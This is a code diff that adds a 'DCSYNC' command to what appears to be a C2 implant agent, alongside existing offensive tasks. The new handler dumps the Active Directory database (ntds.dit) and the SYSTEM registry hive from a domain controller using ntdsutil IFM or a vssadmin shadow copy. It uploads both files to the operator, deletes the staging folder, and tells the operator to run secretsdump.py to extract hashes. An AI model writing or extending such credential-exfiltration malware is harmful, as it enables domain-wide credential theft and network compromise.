@@ -2603,6 +2603,81 @@ void dispatch_task(AgentTask *task) {
         char *out=run_shell(cmd);
         agent_send_result(task->id,out?out:"",out?"":" NTDS_DUMP: run failed"); free(out);
     }
+    else if (strcmp(type_upper, "DCSYNC") == 0) {
+        /* Extract ntds.dit + SYSTEM via IFM (default) or VSS; upload both for offline parsing.
+           Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
+           Offline: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL */
+        char dc_mode[16]="ifm", tmp_dir[MAX_PATH]="C:\\Users\\Public\\dcsync_out";
+        json_get_str(args,"mode",dc_mode,sizeof(dc_mode),"ifm");
+        json_get_str(args,"out",tmp_dir,sizeof(tmp_dir),"C:\\Users\\Public\\dcsync_out");
+        char ntds_path[MAX_PATH], sys_path[MAX_PATH];
+        char dc_err[512]="";
+        int vss_ok = 0;
+
+        if (strcmp(dc_mode,"vss")==0) {
+            /* VSS shadow copy */
+            char *vss_out = run_shell("vssadmin create shadow /for=C: 2>&1");
+            char shadow[MAX_PATH]="";
+            if (vss_out) {
+                char *line = strtok(vss_out, "\n");
+                while (line) {
+                    if (strstr(line,"HarddiskVolumeShadowCopy") && strstr(line,"\\\\?\\")) {
+                        char *tok = strstr(line,"\\\\?\\");
+                        if (tok) { strncpy(shadow,tok,sizeof(shadow)-1); char *ep=shadow+strlen(shadow)-1; while(ep>shadow&&(*ep=='\r'||*ep=='\n'))  *ep--='\0'; break; }
+                    }
+                    line = strtok(NULL,"\n");
+                }
+                free(vss_out);
+            }
+            if (!shadow[0]) {
+                snprintf(dc_err,sizeof(dc_err),"VSS shadow copy failed");
+            } else {
+                char c1[1024],c2[1024],c3[512];
+                snprintf(c3,sizeof(c3),"mkdir \"%s\" 2>&1",tmp_dir);
+                char *r3=run_shell(c3); free(r3);
+                snprintf(c1,sizeof(c1),"copy \"%s\\Windows\\NTDS\\ntds.dit\" \"%s\\ntds.dit\" /Y 2>&1",shadow,tmp_dir);
+                char *r1=run_shell(c1); free(r1);
+                snprintf(c2,sizeof(c2),"copy \"%s\\Windows\\System32\\config\\SYSTEM\" \"%s\\SYSTEM\" /Y 2>&1",shadow,tmp_dir);
+                char *r2=run_shell(c2); free(r2);
+                snprintf(ntds_path,sizeof(ntds_path),"%s\\ntds.dit",tmp_dir);
+                snprintf(sys_path, sizeof(sys_path), "%s\\SYSTEM",tmp_dir);
+                vss_ok = 1;
+            }
+        } else {
+            /* IFM: ntdsutil create full */
+            char rmcmd[512]; snprintf(rmcmd,sizeof(rmcmd),"rmdir /S /Q \"%s\" 2>&1",tmp_dir);
+            char *rr=run_shell(rmcmd); free(rr);
+            char ifmcmd[600]; snprintf(ifmcmd,sizeof(ifmcmd),"ntdsutil \"ac i ntds\" \"ifm\" \"create full %s\" q q 2>&1",tmp_dir);
+            char *ir=run_shell(ifmcmd); free(ir);
+            snprintf(ntds_path,sizeof(ntds_path),"%s\\Active Directory\\ntds.dit",tmp_dir);
+            snprintf(sys_path, sizeof(sys_path), "%s\\registry\\SYSTEM",tmp_dir);
+            vss_ok = 1;
+        }
+
+        if (vss_ok && !dc_err[0]) {
+            /* upload ntds.dit */
+            FILE *f1=fopen(ntds_path,"rb");
+            if (f1) {
+                fseek(f1,0,SEEK_END); long sz1=(long)ftell(f1); rewind(f1);
+                uint8_t *b1=(uint8_t*)malloc(sz1);
+                if(b1&&fread(b1,1,sz1,f1)==(size_t)sz1) agent_upload_file(task->id,"ntds.dit",b1,sz1);
+                free(b1); fclose(f1);
+            } else snprintf(dc_err,sizeof(dc_err),"read ntds.dit failed");
+            /* upload SYSTEM */
+            FILE *f2=fopen(sys_path,"rb");
+            if (f2) {
+                fseek(f2,0,SEEK_END); long sz2=(long)ftell(f2); rewind(f2);
+                uint8_t *b2=(uint8_t*)malloc(sz2);
+                if(b2&&fread(b2,1,sz2,f2)==(size_t)sz2) agent_upload_file(task->id,"SYSTEM",b2,sz2);
+                free(b2); fclose(f2);
+            } else strncat(dc_err,"; read SYSTEM failed",sizeof(dc_err)-strlen(dc_err)-1);
+            char rmcmd2[512]; snprintf(rmcmd2,sizeof(rmcmd2),"rmdir /S /Q \"%s\" 2>&1",tmp_dir);
+            char *rr2=run_shell(rmcmd2); free(rr2);
+            agent_send_result(task->id,"[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",dc_err);
+        } else {
+            agent_send_result(task->id,"",dc_err);
+        }
+    }
     // ── Phase 2a: ADS ─────────────────────────────────────────────────────────
     else if (strcmp(type_upper, "ADS_LIST") == 0) {
         if(!args||!args[0]){agent_send_result(task->id,"","ADS_LIST: path required");return;}
